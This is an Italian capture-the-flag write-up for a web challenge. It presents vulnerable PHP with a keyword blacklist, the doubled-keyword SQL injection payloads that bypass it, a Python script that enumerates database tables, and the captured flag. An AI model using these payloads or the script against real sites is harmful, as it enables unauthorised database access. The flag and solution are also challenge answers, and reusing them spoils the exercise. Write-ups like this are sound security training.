---
titolo: "Write-up: If you have no time, just don't wait"
data: 2026-09-21
categoria: Web
tags:
  - sqli
  - python
---
## 1. Informazioni Generali
* **Piattaforma:** [olicyber.training.it]
* **Difficoltà:** [Media] 
* **Risorsa:** [http://no-time.challs.olicyber.it](http://no-time.challs.olicyber.it)

## 2. Analisi delle vulnerabilità
La pagina permette di vedere il codice sorgente php del server che ci sta dietro.
```php
if(isset($_POST['email']) && is_string($_POST['email'])) {
	$email = $_POST['email'];
	$blacklist = array('SELECT', 'INSERT', 'UNION', 'DELETE', 'ALL', 'WHERE', 'FROM', 'FLAG', 'LIMIT', 'OFFSET');
    
    foreach ($blacklist as $blocked) {
        $email = preg_replace("/$blocked/i", '', $email);
    }
    
    $query = "SELECT email FROM emails WHERE email = '$email'";
	// go query, execute!
    $stmt = $conn->query($query);
    $stmt->execute();
	$result = $stmt->fetch();
	$stmt->closeCursor();
    
	if($result !== false) {
	    $res = htmlspecialchars($result['email']);
	    echo "La mail ($res) è già presente nel database!";
	} else {
	    $stmt = $conn->prepare("INSERT INTO emails VALUES (:email)");
	    $stmt->bindParam(":email", $email, PDO::PARAM_STR);
	    $stmt->execute();
	    echo "La mail è stata inserita nel database!";
	}
}
```
Si può notare come la prima query non utilizza la parametrizzazione, quindi è soggetta a **SQL Injection (SQLi)**. Però c'è una blacklist di parole che vengono rimosse, per evitare iniezione di codice SQL. Tuttavia questo filtro si può raggirare: infatti se ad esempio scrivo "SELSELECTECT", la parola "SELECT" in mezzo verrà eliminata, ma rimarrà comunque "SELECT".

## 3. Exploitation
Prima di tutto costruisco una query da iniettare per ottenere delle informazioni
``` sql
' UNUNIONION SELSELECTECT table_name FRFROMOM information_schema.TABLES LILIMITMIT 0, 1#
```
(Notare che ho sfruttato il modo per raggirare il filto delle parole chiave)
Partendo da questa query posso ottenere il nome di tutte le tabelle del db, ma per farlo devo incrementare l'offset ogni volta in modo da scorrere tutti i risultati della query.

Per questo motivo utilizzo il seguente script python:
```python
from bs4 import BeautifulSoup
from urllib.parse import quote_plus
import requests
import re

url = 'http://no-time.challs.olicyber.it/'

offset = 0

while True:
    email = quote_plus(f"' UNUNIONION SELSELECTECT table_name FRFROMOM information_schema.TABLES LILIMITMIT {offset}, 1#")
    payload = f'email={email}'
    post = requests.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
    html = BeautifulSoup(post.content, 'html.parser')
    p = html.find('p', string=re.compile("La mail", re.IGNORECASE))
    dbInfo = re.search(r'\((.*?)\)', p.text)
    print(dbInfo.group(1))
    offset = offset + 1
```
Facendo girare il codice ottengo il seguente risultato:

![[Pasted image 20260921150524.png]]

Come si vede, all'interno del db è presente la tabella *qua_trovi_la_tua_flag*, quindi ora basta ineittare la query per ottenere la flag da quella tabella:
``` sql
' UNUNIONION SELSELECTECT * FRFROMOM qua_trovi_la_tua_flag ORDER BY email DESC#
```
Ora ho la flag: **flag{1_d0n7_w4n7_70_w41t_ju57_61v3_m3_fl4g!}**